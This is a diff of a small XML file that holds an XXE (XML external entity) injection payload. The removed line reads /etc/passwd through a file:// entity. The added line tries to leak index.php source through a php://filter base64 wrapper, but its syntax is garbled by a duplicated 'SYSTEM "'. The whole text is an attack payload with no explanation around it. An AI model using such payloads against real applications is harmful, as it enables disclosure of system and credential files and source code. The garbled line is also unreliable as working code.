@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE a [
-    <!ENTITY content SYSTEM "file:///etc/passwd">]>
+    <!ENTITY content SYSTEM "SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
 <foo>
         <value>&content;</value> 
 </foo>
